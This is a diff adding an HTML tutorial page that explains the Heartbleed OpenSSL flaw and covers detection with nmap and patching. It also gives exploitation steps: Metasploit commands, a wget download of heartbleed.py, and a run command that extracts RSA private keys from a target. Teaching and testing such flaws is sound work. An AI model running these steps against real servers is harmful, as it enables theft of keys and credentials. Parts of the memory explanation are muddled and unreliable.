@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Heartbleed vulnerability explained</title>
+    <link rel="shortcut icon" href="../favicon/favicon.ico"/>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="../typewriter.js"></script>
+    <link rel="stylesheet" type="text/css" href="../stacksec.css">
+    
+    <meta charset="UTF-8">
+    <meta name="description" content="Documentation about the heartbleed vulnerability. In-depth explanation and exploitation examples. How to protect yourself.">
+    <meta name="keywords" content="security,hacking,hack,heartbleed,krack,crack,stack,memory,stacksec,it,secure,securing,hacks,hackers,system,systems,computers,documentation,tutorial,explanation,how,to,writeup,document,vulnerability,exploit,metaspoit,kali,linux,windows,mac,vulnerable,exploitable,vuln,meta,sploit,payload,scanning,nmap,black,white,grey,hat,information,info,book,write,secu,bleeding,heart,protect,exploitation,information security">
+    <meta name="author" content="John Doe">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<!-- BODY -->
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <!-- HEADER -->
+            <div class"col">
+                <nav class="navbar navbar-inverse">
+                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="#">StackSec</a>
+                </nav>
+            </div>
+            <br /><br />
+            <!-- END OF HEADER -->
+            <div class="col-sm-2">
+                <!-- NAV -->
+                <nav class="navbar navbar-default">
+                    <div class="container-fluid">
+                        <div class="collapse navbar-collapse" id="navbar">
+                            <h4>0xN4V</h4>
+                            <ul class="nav navbar-nav">
+                                <li><a href="../index.html" data-chaffle="en">HOME</a></li>
+                                <li><a href="../data.html" data-chaffle="en">>> DOCS</a></li>
+                                <li><a href="../readme.html" data-chaffle="en">README.TXT</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </nav>
+                <!-- END OF NAV -->
+            </div>
+            <!-- CONTENT -->
+            <div class="col-sm-7">
+                <div class="container-fluid">
+                    <h1>Heartbleed vulnerability</h1>
+                    <hr />
+                    <!-- BREADCRUMBS -->
+                     <ol class="breadcrumb">
+                        <li class="breadcrumb-item"><a href="../index.html">Home</a></li>
+                        <li class="breadcrumb-item"><a href="../data.html">Docs</a></li>
+                        <li class="breadcrumb-item active">Heartbleed vulnerability</li>
+                    </ol>
+                    <div class="row top-buffer">
+                        <div class="col-sm-8">
+                            <table class="table table-bordered">
+                                <thead>
+                                <tr>
+                                    <th colspan="2">0x5UMM4RY</th>
+                                </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>Software:</td>
+                                        <td><a href="https://www.openssl.org/">OpenSSL</a></td>
+                                    </tr>
+                                    <tr>
+                                        <td>Date found:</td>
+                                        <td>April 1, 2014 11:09 UTC</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Vulnerable version(s):</td>
+                                        <td>1.0.1 to 1.0.1f</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Date patched:</td>
+                                        <td>April 7, 2014</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Patched version(s):</td>
+                                        <td>1.0.1g</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        <div class="col-sm-4">
+                            <center><img src="../images/heartbleed.png" alt="Heartbleed" height="175" width="150"></center>
+                        </div>
+                    </div>
+                    <div class="row top-buffer">
+                        <!-- ARTICLE CONTENT -->
+                        <p>0xL1NK#~ <a href="https://www.rapid7.com/db/vulnerabilities/http-openssl-cve-2014-0160">CVE-2014-0160</a></p>
+                        <br />
+                         <ol>
+                            <li><h5>Description</h5></li>
+                            <p>Heartbleed is a vulnerability in the OpenSSL implementation - OpenSSL implemented the widely used protocols: SSL (Secure Sockets Layer) and TLS (Transport Layer Security). The flaw in OpenSSL gives an attacker the ability to extract encrypted data from TLS/SSL secured networks.</p>
+                            <p>The vulnerability is essentially in the heartbeat that's sent between two systems communicating over TLS/SSL. Let's say we are system 1 and Google is system 2. The heartbeat is there to check if the connection between us and Google is still alive, in case there is no activity on the connection for a longer period of time. The heartbeat itself is an encrypted packet sent from us to Google, with a maximum size of 64KB. Let's say we send a heartbeat packet with size 32KB to Google, the packet tells the Google server to expect a 32KB message, so the Google server allocates 32KB of memory, to store the encrypted data from the heatbeat packet, then it reads it back out of memory and sends the heartbeat packet with size 32KB back to our browser.</p>
+                            <p>How do we exploit this, you might wonder? In order to read encrypted data from the TLS/SSL connection we need to trick the receiving server, in this case Google, in thinking it's receiving more data than we are actually sending in the heartbeat. What we're gonna do is forge a malicious heartbeat packet that is gonna tell Google: "Hey, get ready for 64KB of data!", but in reality we are only sending a heartbeat packet of 16KB to Google. This causes Google to allocate 64KB in its memory, and only store 16KB of data in it, since we only sent Google 16KB. Now the flaw in the system is that the receiving end (Google) doesn't check if it has actually received 64KB of data. Google has allocated 64KB in its memory, and will also send back 64KB of data it reads from its own memory, even though we only sent 16KB. This means that Google will return 16KB of data + 48KB of data that is currently present in memory. Now we have extracted 48KB of information that we actually have no access to!</p>
+                            <p>The information you receive could either be nothing but random crap, or you could receive SSL private keys, usernames, passwords or other sensitive data. Below is an example of such output:</p>
+                            <img src="https://vagn.es/img/heartbleedoutput1.png" alt="Heartbleed printable output" width="100%">
+                            <li><h5>Why is it vulnerable?</h5></li>
+                            <p>The vulnerability comes forth from a single line of code in <b>OpenSSL</b>.</p>
+                            <code>
+                                <p>memcpy(bp, pl, payload);</p>
+                            </code>
+                            <br />
+                            
+                            <p>This line of code is a programming mistake that broke the interwebs. But what does this line mean? The function memcpy copies data, and requires three values to copy this data. The first variable 'bp' is the destination of the data that needs to be copied, so this is a place inside memory on the Google server. The second variable 'pl' is the location of the data that needs to be copied, which means it's the data we sent as a heartbeat to Google (with size 16KB). The third variable 'payload' is a value that indicates how big 'pl' is. In our case this is 64KB.</p>
+                            <p>Copying data on a computer is not as straight forward as you think, because there is no such thing as empty memory. This means that 'bp', the location where 'pl' is going to be copied, isn't empty, but full of data that has been marked for deletion, waiting to be overwritten, by 'pl' for example.</p>
+                            <p>How it should work is that when memcpy takes our 16KB heartbeat data from 'pl' and copies it to location 'bp' with payload = 16KB in Google's memory, the location in memory will overwrite the old data that has been marked for deletion, with our new 16KB of data. It will be a perfect fit since according to the payload value, 16KB has been reserved in Google's memory.</p>
+                            <p>I can hear you thinking already: "Yeah so what if i change the 'payload' value to 64KB while our 'pl' data size is only 16KB?". That is exactly how we can extract extra data from Google memory. memcpy will make a 64KB reservation on the Google server's memory but only 16KB of data will be overwritten, leaving 48KB of still intact (marked for deletion) data available in the reservation. The server will return the full 64KB of data back to us, including the 48KB of random data.</p>
+                            <center><a href="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Simplified_Heartbleed_explanation.svg/1024px-Simplified_Heartbleed_explanation.svg.png"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Simplified_Heartbleed_explanation.svg/1024px-Simplified_Heartbleed_explanation.svg.png" width="500" height="500"></a></center>
+                            <li><h5>Check for vulnerability</h5></li>
+                            <p>If you want to check your server for the heartbleed vulnerability, you can do this in a couple of ways.</p>
+                            <ol>
+                                <li>Nmap</li>
+                                <p>Via nmap you can test your system with the following command:</p>
+                                <code>
+                                    <p># Syntax</p>
+                                    <p>nmap -p [port] --script ssl-heartbleed [target]</p>
+                                    <br />
+                                    <p># Example</p>
+                                    <p>nmap -p 443 --script ssl-heartbleed 10.10.10.79</p>
+                                </code>
+                                <br />
+                                <li>Online</li>
+                                <p>You could enter your IP/Domain on a site such as <a href="https://sslanalyzer.comodoca.com/heartbleed.html">Comodo SSL Analyzer</a> to check if your system is vulnerable.</p>
+                            </ol>
+                            <li><h5>How to exploit it?</h5></li>
+                            <p>Due to the nature of this exploit, it will not leave any traces on the target computer. The exploit can be done very easily with a default metasploit module, to start, open up the metasploit CLI: </p>
+                            <p><i>** Disclaimer: The following steps are done in <a href="https://www.kali.org/">Kali 2018.1</a> **</i></p>
+                            <code>
+                                <p>msfconsole</p>
+                            </code>
+                            <br />
+                            <p>Next, load the module: </p>
+                            <code>
+                                <p>use auxiliary/scanner/ssl/openssl_heartbleed</p>
+                            </code>
+                            <br />
+                            <p>You could display the options, but initially most of the options are fine by default. The only things we have to set are RHOSTS, VERBOSE, and optionally THREADS:</p>
+                            <code>
+                                <p>set RHOSTS 10.10.10.79</p>
+                                <p>set THREADS 50</p>
+                                <p>set VERBOSE true</p>
+                                <p>exploit</p>
+                            </code>
+                            <br />
+                            <p>With every heartbeat you send, 64KB of data will be returned in the output. Note that if you do not set the VERBOSE parameter to true, you will not directly receive this printable output. You should also notice that with every chunk of data you receive, the data is different. That's because you're always retrieving a different part of the targets' memory - always the +64KB of where our heartbeat is allocated in memory.</p>
+                            <p>Manually probing the target system, heartbeat after heartbeat is pretty boring, so that's why there are some wonderful people who wrote <a href="https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py">heartbleed.py</a>. This is a script that automates the heartbeats, and even lets you extract the RSA private key if it's found in the 64KB chunk. Download the script by clicking on the link above or via wget:</p>
+                            <code>
+                                <p>wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py</p>
+                            </code>
+                            <br />
+                            <p>To run the script, it could be that you'll have to install a missing module. This can be done with pip:</p>
+                             <code>
+                                <p># Syntax</p>
+                                <p>sudo pip install [module]</p>
+                                <br />
+                                <p># Example</p>
+                                <p>sudo pip install gmpy</p>
+                            </code>
+                            <br />
+                            <p>To run the script, you can specify the following parameters:</p>
+                            <code>
+                                <p># Syntax</p>
+                                <p>python heartbleed.py -p [port] -n [amount of retries] -e [ip]</p>
+                                <br />
+                                <p># Example</p>
+                                <p>python heartbleed.py -p 443 -n 2000 -e 10.10.10.79</p>
+                            </code>
+                            <br />
+                            <p>The parameters do the following:</p>
+                            <p><b>-p</b> : Specifies the port.</p>
+                            <p><b>-n</b> : Specifies the number of times to repeat the heartbeat.</p>
+                            <p><b>-e</b> : Attempt to extract the RSA private key and exit the script when it's found.</p>
+                            <br />
+                            <p>If you want extra help with this script, you can always just type in:</p>
+                            <code>
+                                <p>python heartbleed.py -h</p>
+                            </code>
+                            <br />
+                            <li><h5>How to protect against heartbleed</h5></li>
+                            <p>To protect yourself against the heartbleed bug, you can update OpenSSL to version 1.0.1g or later.</p>
+                            <p>After patching the vulnerability, you should treat your private key, passwords and certificates as compromised. This means that it's highly recommended to regenerate new keypairs, reissue your certificates, and change your passwords. The reason being is because when an attacker used the heartbleed bug against your systems, he could've pulled any information that's in that system's memory at that point.</p>
+                        </ol>
+                        <br />
+                        <center><b><p>** For more information, check out the extra links and sources. **</p></b></center>
+                        <h5>50URC35:<h5>
+                        <ul id="sources">
+                            <li><a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed Wikipedia</a></li>
+                            <li><a href="https://www.csoonline.com/article/3223203/vulnerabilities/what-is-the-heartbleed-bug-how-does-it-work-and-how-was-it-fixed.html">What is the Heartbleed bug, how does it work and how was it fixed?</a></li>
+                            <li><a href="https://gizmodo.com/how-heartbleed-works-the-code-behind-the-internets-se-1561341209">How Heartbleed Works: The Code Behind the Internet's Security Nightmare</a></li>
+                        </ul>
+                        <!-- END OF ARTICLE CONTENT -->
+                    </div>
+                </div>
+            </div>
+            <div class="col-sm-2">
+                <h4>0xR3L4T3D_L1NK5<h4>
+                <br />
+                <ul id="links">
+                        <li><a href="http://heartbleed.com/">heartbleed.com</a></li>
+                        <li><a href="https://readwrite.com/2014/04/13/heartbleed-security-codenomicon-discovery/">How Codenomicon Found The Heartbleed Bug Now Plaguing The Internet</a></li>
+                </ul>
+            </div>
+            <!-- END OF CONTENT -->
+            <!-- SCRIPTS -->
+            <script src="../chaffle/chaffle.min.js" charset="utf-8"></script>
+            <script>
+                var elements = document.querySelectorAll('[data-chaffle]');
+                var elm = document.querySelectorAll('[data-chaffle-onLoad]');
+
+                Array.prototype.forEach.call(elements, function (el) {
+                    var chaffle = new Chaffle(el)
+                    el.addEventListener('mouseover', function () {
+                        chaffle.init();
+                    });
+                });
+
+                Array.prototype.forEach.call(elm, function (el) {
+                    var chaffle = new Chaffle(el, {
+                        delay: 200
+                    })
+                    setInterval(function(){
+                        chaffle.init();
+                    }, 8000)
+                });
+            </script>
+            <!-- END OF SCRIPTS -->
+        </div>
+    </div>
+<!-- END OF BODY -->
+</body>
+</html>
